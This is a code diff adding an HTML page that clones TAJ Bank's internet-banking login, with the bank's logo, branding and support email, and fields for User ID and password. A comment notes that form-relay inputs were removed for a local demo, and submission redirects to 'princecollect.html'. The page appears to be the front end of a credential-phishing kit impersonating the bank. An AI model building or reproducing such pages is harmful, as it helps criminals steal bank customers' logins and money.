@@ -28,3 +28,215 @@
     <p>Loading TAJ Bank Clone...</p>
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>TAJ Bank - Internet Banking Login</title>
+<style>
+  /* Basic reset */
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%}
+
+  /* Background color fallback (visible if images fail) */
+  body{
+    font-family: "Segoe UI", Roboto, Arial, sans-serif;
+    background-color:#dcdfe3; /* fallback background color */
+    color:#222;
+    height:100vh;
+    overflow:hidden;
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+  }
+
+  /* Fullscreen slideshow container */
+  #bg-slide{
+    position:fixed;
+    inset:0;
+    z-index:-10;
+    background-color:#dcdfe3; /* same fallback */
+  }
+  #bg-slide img{
+    position:absolute;
+    inset:0;
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    opacity:0;
+    filter:brightness(.75); /* darken a bit for contrast with card */
+    transition:opacity 1s ease-in-out;
+  }
+  /* Make three images cycle */
+  #bg-slide img.show{opacity:1}
+
+  /* Overlay to dim background (so card stands out) */
+  .overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.45);
+    z-index:-5;
+  }
+
+  /* TAJ logo top-left or top-right - adapt as needed */
+  .bank-logo{
+    position:fixed;
+    left:30px;
+    top:18px;
+    width:170px;
+    max-width:22%;
+    z-index:20;
+    user-select:none;
+  }
+
+  /* Right-side login container */
+  .page{
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:flex-end; /* right side */
+    padding:40px;
+    z-index:30;
+    position:relative;
+  }
+
+  .card{
+    width:500px;
+    min-height:500px;
+    background:#fff;
+    border-radius:10px;
+    padding:26px;
+    box-shadow:0 20px 50px rgba(0,0,0,0.35);
+    margin-left:40px;
+    margin-right:50px;   /* NEW: space at right side */
+}
+
+
+  .card h2{color:#E41613;text-align:center;font-size:20px;margin-bottom:6px}
+  .line{height:4px;width:64px;background:#E41613;border:none;margin:10px auto 18px}
+
+  .card p.sub{color:#555;text-align:center;margin-bottom:18px;font-size:14px}
+
+  .field{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    background:#f4f4f6;
+    padding:11px 12px;
+    border-radius:6px;
+    margin-bottom:12px;
+  }
+  .field input{
+    border:0;outline:0;background:transparent;width:100%;font-size:14px;
+  }
+
+  .forgot{ text-align:right;margin-bottom:16px }
+  .forgot a{ color:#E41613;text-decoration:none;font-size:13px }
+
+  .button{
+    width:100%;
+    background:#E41613;
+    color:#fff;
+    border:none;
+    padding:18px;
+    border-radius:6px;
+    font-weight:700;
+    cursor:pointer;
+    font-size:15px;
+  }
+  .button:hover{ background:#b90f0f }
+
+  .card .contact{ font-size:12px;color:#444;margin-top:14px;text-align:center }
+  .card .contact a{ color:#E41613;text-decoration:none }
+
+  .copyright{ text-align:center;font-size:12px;color:#777;margin-top:14px }
+
+  @media(max-width:900px){
+    .page{ justify-content:center;padding:20px }
+    .bank-logo{ left:14px; width:120px }
+  }
+</style>
+</head>
+<body>
+
+  <!-- Background slideshow images (use the filenames you have) -->
+  <div id="bg-slide" aria-hidden="true">
+    <!-- prefer renamed filenames if you renamed; otherwise the encoded path is here too -->
+    <img id="bg1" src="images/banner-bg1.jpeg" alt="bg1" />
+    <img id="bg2" src="images/banner-bg3%201.png" alt="bg2" />
+    <img id="bg2b" src="images/banner-bg3-1.png" alt="bg2b" style="display:none" />
+    <img id="bg3" src="images/banner-bg8.jpeg" alt="bg3" />
+  </div>
+
+  <div class="overlay"></div>
+
+  <!-- Logo: try both encoded and hyphen name if needed -->
+  <img class="bank-logo" src="images/tajbank%201.png" alt="TAJ Bank Logo"
+       onerror="this.onerror=null; this.src='images/tajbank-1.png';" />
+
+  <div class="page" role="main">
+    <div class="card" role="region" aria-label="Login">
+      <h2>Internet Banking</h2>
+      <hr class="line" />
+      <p class="sub">Welcome to TAJ Bank - Login to access your profile</p>
+
+      <form id="loginForm" onsubmit="return submitAndRedirect(event)">
+        <div class="field">
+          <input type="text" name="username" placeholder="Enter User ID" required autocomplete="off">
+        </div>
+
+        <div class="field">
+          <input type="password" name="password" placeholder="Enter Password" required autocomplete="off">
+        </div>
+
+        <div class="forgot"><a href="/Account/ForgotPassword">Forgot Password?</a></div>
+
+        <!-- keep FormSubmit hidden inputs if you want to use them; removed for local demo -->
+        <button class="button" type="submit">DONALD</button>
+      </form>
+
+      <div class="contact">
+        <div>Contact Support: <a href="mailto:tajconnect@tajbank.com">tajconnect@tajbank.com</a></div>
+      </div>
+
+      <div class="copyright">© 2025. All Rights Reserved.</div>
+    </div>
+  </div>
+
+<script>
+  // Slideshow logic: cycles images by toggling 'show' class
+  (function(){
+    const imgs = Array.from(document.querySelectorAll('#bg-slide img')).filter(i=>i.complete || true);
+    // Filter visible images only (exclude the backup hidden element if present)
+    const visibleImgs = imgs.filter(img => img.style.display !== 'none');
+    let i = 0;
+    function showNext(){
+      visibleImgs.forEach((img, idx)=> img.classList.toggle('show', idx === i));
+      i = (i+1) % visibleImgs.length;
+    }
+    // initial
+    showNext();
+    // 6s per image
+    setInterval(showNext, 6000);
+  })();
+
+  // Submit handler: navigate to princecollect.html like your original code
+  function submitAndRedirect(e){
+    e.preventDefault();
+    // If you want to actually send the form to a server, use fetch/XHR here.
+    // But as requested: redirect to princecollect.html after submit
+    // Preserve 200ms small delay like your original code.
+    setTimeout(()=> window.location.href = 'princecollect.html', 200);
+    return false;
+  }
+
+  // Helpful console hint if image missing
+  window.addEventListener('error', function(ev){
+    if(ev.target && ev.target.tagName === 'IMG'){
+      console.warn('Image failed to load:', ev.target.src);
+    }
+  }, true);
+</script>
+
+</body>
+</html>
